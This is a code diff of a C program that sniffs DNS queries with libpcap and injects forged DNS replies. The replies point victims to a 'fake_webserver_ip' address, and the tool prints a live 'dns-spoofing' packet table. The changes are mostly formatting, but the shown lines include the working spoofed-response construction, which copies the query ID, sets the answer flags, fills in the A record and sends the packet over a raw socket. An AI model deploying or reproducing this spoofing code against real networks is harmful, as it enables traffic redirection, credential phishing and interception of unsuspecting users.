@@ -58,15 +58,17 @@ int packet_capture_start(){
 		}
         pcap_close(adhandle);
 	}
-
+    printf("  ┌────────────────────┐  \n");
+    printf("┌─┤  Select interface  ├─┐\n");
+    printf("│ └────────────────────┘ │\n");
 	for (int i = 0; i < interface_list.size(); i++) {
-        printf("%d : %s\n", i+1, interface_list[i]);
+        printf("│ %-2d- %-10s         │\n", i+1, interface_list[i]);
 	}
+    printf("└────────────────────────┘\n");
     
     int select_interface_number;
 	printf("Enter the interface number you would like to sniff : ");
 	scanf("%d", &select_interface_number);
-    printf("\n"); 
 
     if(select_interface_number <1 || select_interface_number > interface_list.size()){
         printf("Network interface out of range\n");
@@ -91,9 +93,9 @@ int packet_capture_start(){
 
     my_ip = set_my_ip(interface_list[select_interface_number-1]);
     printf("┌───────────────────────────────────────────────────────────────────────────────────────────────────┐\n");
-    printf("│ dns-spoofing: linstening on %d [udp dst port 53 and not src %15s]                       │\n", select_interface_number, my_ip);
+    printf("│            dns-spoofing: linstening on %d [udp dst port 53 and not src %15s]            │\n", select_interface_number, my_ip);
     printf("├────┬─────────────────┬───────┬─────────────────┬───────┬───────────┬────────┬───┬─────────────────┤\n");
-    printf("│Info│ source ip       │ sport │ destination ip  │ dport │ Data size │   ID   │Q&A│   information   │\n");
+    printf("│Info│    source ip    │ sport │ destination ip  │ dport │ Data size │   ID   │Q&A│   information   │\n");
     printf("└────┴─────────────────┴───────┴─────────────────┴───────┴───────────┴────────┴───┴─────────────────┘");
     fflush(stdout);
 
@@ -101,7 +103,7 @@ int packet_capture_start(){
     pcap_freealldevs(alldevs);
 
     while (1) {
-		if ((pkt_data = pcap_next(adhandle, &header)) != NULL) {
+        if ((pkt_data = pcap_next(adhandle, &header)) != NULL) {
             packet_handler(NULL, &header, pkt_data);
         }
     }
@@ -154,22 +156,12 @@ void packet_handler(u_char *param,const struct pcap_pkthdr *header, const u_char
         memset(dns_response, 0x00, 1024);
         unsigned char* dns_reply_hdr = dns_response + sizeof(ip_header) + sizeof(udp_header);
 
-        dns_reply_hdr[0]=dns->ID & 0xff; 
-        dns_reply_hdr[1]=(dns->ID >> 8) & 0xff;
-        dns_reply_hdr[2]=0x81;
-        dns_reply_hdr[3]=0x80;
-
-        dns_reply_hdr[4]=dns->QDCNT & 0xff; 
-        dns_reply_hdr[5]=(dns->QDCNT >> 8) & 0xff;
-
-        dns_reply_hdr[6]=0x00;
-        dns_reply_hdr[7]=0x01;
-
-        dns_reply_hdr[8] = dns->NSCNT & 0xff;
-        dns_reply_hdr[9]=(dns->NSCNT >> 8) & 0xff;
-
-        dns_reply_hdr[10] = dns->ARCNT & 0xff;
-        dns_reply_hdr[11]=(dns->ARCNT >> 8) & 0xff;
+        dns_reply_hdr[0]=dns->ID & 0xff; dns_reply_hdr[1]=(dns->ID >> 8) & 0xff;
+        dns_reply_hdr[2]=0x81; dns_reply_hdr[3]=0x80;
+        dns_reply_hdr[4]=dns->QDCNT & 0xff; dns_reply_hdr[5]=(dns->QDCNT >> 8) & 0xff;
+        dns_reply_hdr[6]=0x00; dns_reply_hdr[7]=0x01;
+        dns_reply_hdr[8] = dns->NSCNT & 0xff; dns_reply_hdr[9]=(dns->NSCNT >> 8) & 0xff;
+        dns_reply_hdr[10] = dns->ARCNT & 0xff; dns_reply_hdr[11]=(dns->ARCNT >> 8) & 0xff;
     
         int size = header->caplen-54-4;
 
@@ -177,34 +169,18 @@ void packet_handler(u_char *param,const struct pcap_pkthdr *header, const u_char
             dns_reply_hdr[12+i]=pkt_data[i+54];
         }
 
-        dns_reply_hdr[size+12]=0x00; 
-        dns_reply_hdr[size+13]=0x01; 
-
-        dns_reply_hdr[size+14]=0x00; 
-        dns_reply_hdr[size+15]=0x01; 
-
-        dns_reply_hdr[size+16]=0xc0;
-        dns_reply_hdr[size+17]=0x0c;
-
-        dns_reply_hdr[size+18]=0x00;
-        dns_reply_hdr[size+19]=0x01;
-
-        dns_reply_hdr[size+20]=0x00;
-        dns_reply_hdr[size+21]=0x01;
-
-        dns_reply_hdr[size+22]=0x00;
-        dns_reply_hdr[size+23]=0x00;
-        dns_reply_hdr[size+24]=0x00;
-        dns_reply_hdr[size+25]=0x34;
-
-        dns_reply_hdr[size+26]=0x00;
-        dns_reply_hdr[size+27]=0x04;
-
+        dns_reply_hdr[size+12]=0x00; dns_reply_hdr[size+13]=0x01; 
+        dns_reply_hdr[size+14]=0x00; dns_reply_hdr[size+15]=0x01; 
+        dns_reply_hdr[size+16]=0xc0; dns_reply_hdr[size+17]=0x0c;
+        dns_reply_hdr[size+18]=0x00; dns_reply_hdr[size+19]=0x01;
+        dns_reply_hdr[size+20]=0x00; dns_reply_hdr[size+21]=0x01;
+        dns_reply_hdr[size+22]=0x00; dns_reply_hdr[size+23]=0x00;
+        dns_reply_hdr[size+24]=0x00; dns_reply_hdr[size+25]=0x34;
+        dns_reply_hdr[size+26]=0x00; dns_reply_hdr[size+27]=0x04;
 
         unsigned char ip_in_hex[4];
         sscanf(fake_webserver_ip, "%d.%d.%d.%d",(int *)&ip_in_hex[0],(int *)&ip_in_hex[1], (int *)&ip_in_hex[2], (int *)&ip_in_hex[3]); //copy arg to int array
         memcpy(&dns_reply_hdr[size+28], ip_in_hex, 4);
-
 
         int full_size = size+32;
 
@@ -240,8 +216,7 @@ void packet_handler(u_char *param,const struct pcap_pkthdr *header, const u_char
             printf("setsockopt hdrincl error\n");
         };
 
-        int result = sendto(sfd, dns_response, full_size, 0, (struct sockaddr *)&serv_addr,
-                            sizeof(serv_addr));
+        int result = sendto(sfd, dns_response, full_size, 0, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
 
         if(result < 0) {
             printf("error sending udp %d\n", result);
@@ -300,20 +275,14 @@ void print_packet_data(const struct pcap_pkthdr *header, const u_char *pkt_data)
     
     // Ethernet header
     printf("Ether Header\n");
-    printf(" | -Destination Address : %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n",
-           eth->dst_host[0], eth->dst_host[1], eth->dst_host[2],
-           eth->dst_host[3], eth->dst_host[4], eth->dst_host[5]);
-    printf(" | -Source Address : %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n",
-           eth->src_host[0], eth->src_host[1], eth->src_host[2],
-           eth->src_host[3], eth->src_host[4], eth->src_host[5]);
+    printf(" | -Destination Address : %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n", eth->dst_host[0], eth->dst_host[1], eth->dst_host[2], eth->dst_host[3], eth->dst_host[4], eth->dst_host[5]);
+    printf(" | -Source Address : %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n", eth->src_host[0], eth->src_host[1], eth->src_host[2], eth->src_host[3], eth->src_host[4], eth->src_host[5]);
     printf(" | -Protocol : 0x%.4x\n", ntohs(eth->frame_type));
     
     // IP Header
     printf("IP Header\n");
-    printf(" | -Source IPaddress : %d.%d.%d.%d\n", ip->saddr.byte1,
-           ip->saddr.byte2, ip->saddr.byte3, ip->saddr.byte4);
-    printf(" | -Destination IPaddress : %d.%d.%d.%d\n", ip->daddr.byte1,
-           ip->daddr.byte2, ip->daddr.byte3, ip->daddr.byte4);
+    printf(" | -Source IPaddress : %d.%d.%d.%d\n", ip->saddr.byte1, ip->saddr.byte2, ip->saddr.byte3, ip->saddr.byte4);
+    printf(" | -Destination IPaddress : %d.%d.%d.%d\n", ip->daddr.byte1, ip->daddr.byte2, ip->daddr.byte3, ip->daddr.byte4);
 
     // UDP Header
     printf( "UDP Header\n");
